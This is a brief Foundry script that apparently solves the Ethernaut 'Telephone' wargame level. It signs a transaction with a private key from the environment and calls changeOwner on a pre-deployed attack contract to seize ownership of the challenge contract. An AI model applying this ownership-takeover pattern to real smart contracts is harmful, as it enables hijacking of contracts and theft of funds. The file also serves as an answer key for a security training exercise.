// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import {TelephoneHack} from "ethernaut/telephone_hack.sol";
import "forge-std/console.sol";

contract TelephoneHackScript is Script {
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        TelephoneHack telephoneHack = TelephoneHack(0x1DDbf1d8148479a7BF2e87C8cd564Fa94ed3D05D);
        telephoneHack.changeOwner(vm.envAddress("MY_ADDRESS"));

        vm.stopBroadcast();
    }
}
